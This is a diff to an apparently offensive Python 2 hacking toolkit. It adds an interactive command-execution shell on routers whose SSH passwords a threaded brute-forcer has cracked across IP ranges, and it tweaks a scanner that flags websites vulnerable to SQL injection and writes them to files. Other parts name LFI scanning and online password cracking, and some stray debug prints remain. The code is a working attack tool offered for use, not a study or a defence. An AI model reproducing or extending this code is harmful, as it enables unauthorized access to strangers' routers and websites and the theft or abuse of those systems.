@@ -62,13 +62,18 @@ class Router(threading.Thread):
             try:
                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)
                 ssh.close()
+            except:
+                print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
+            else:
+                global found
                 print "Working: %s:22 - %s:%s\n" % (ip_add, self.user, self.passw)
                 write = open('Routers.txt', "a+")
                 write.write('%s:22 %s:%s\n' % (ip_add, self.user, self.passw))
                 write.close()  
-            except:
-                print 'Not Working: %s:22 - %s:%s\n' % (ip_add, self.user, self.passw)
-                
+                found.append(ip_add)
+            finally:
+                self.queue.task_done()
+                           
             
 class Ip:
     """Handles the Ip range creation"""
@@ -104,6 +109,45 @@ class Ip:
             thread.setDaemon(True)
             thread.start() 
         queue.join()
+        self.command()
+
+    def command(self):
+        """Allows user to run commands on a chosen router"""
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        num = 0
+        if found:
+            for addr in found:
+                print "[%s] %s " % (num, addr)
+                num += 1
+            again = 'y'
+            while again == 'y':
+                choose = raw_input('Enter number to attempt command execution(q to quit):')
+                if choose != 'q':
+                    chosen = found[int(choose)]
+                    print 'Connecting to %s' % (chosen)
+                    try:
+                        ssh.connect(chosen, username = self.user, password = self.passw, timeout = 10)
+                    except:
+                        print 'Problem connecting'
+                    else:
+                        commanding = 'y'
+                        print 'Enter q to quit'
+                        while commanding == 'y':
+                            execute = raw_input(self.user + '@' + chosen + ':~$ ') 
+                            if execute == 'q':
+                                commanding = 'n'
+                                ssh.close()
+                            else:
+                                try:
+                                    stdin, stdout, stderr = ssh.exec_command(execute)
+                                    print stdout.read()
+                                except:
+                                    print 'Whoops'
+
+                    again = raw_input('Go again(y or n)')
+                else:
+                    break
 
 
 class Crawl:
@@ -205,6 +249,7 @@ class ScanClass(threading.Thread):
                         self.mysql(test)
                         vuln += 1
                     elif (re.findall('JET Database Engine', data, re.I)):
+                        print 'aaaa'
                         self.mssql(test)
                         vuln += 1
                     elif (re.findall('Microsoft OLE DB Provider for', data, re.I)):
@@ -227,17 +272,17 @@ class ScanClass(threading.Thread):
         else:
             print "MySql: " + url
             write = open(self.file, "a+")
-            write.write('[SQLI]: ' + url + "\n")
+            write.write(url + "\n")
             write.close()
 
     def mssql(self, url):
         """Proccesses vuln sites into text file and outputs to screen"""
-        read = open(self.file).read()
+        read = open('MsSql.txt', "a+").read()
         if url in read:
             print 'Dupe: ' + url
         else:
             print "MsSql: " + url
-            write = open ('[SQLI]: ' + self.file, "a+")
+            write = open(self.file, "a+")
             write.write(url + "\n")
             write.close()   
 
@@ -573,6 +618,7 @@ def word():
         thread.setDaemon(True)
         thread.start()
     queue.join()
+    print 'aaaaa'
 
 
 class OnlineCrack:
@@ -621,7 +667,7 @@ def output():
     print '>> ' + str(invuln) + ' Sites Not Vulnerable'
     print '>> ' + str(np) + ' Sites Without Parameters'
     if option == '1':
-        print '>> Output Saved To Sqli.txt\n'
+        print '>> Output Saved To MySql.txt or MsSql.txt\n'
     elif option == '2':
         print '>> Output Saved To Lfi.txt'
     elif option == '3':
@@ -729,5 +775,3 @@ def main():
  
 if __name__ == '__main__':
     main()
-
-
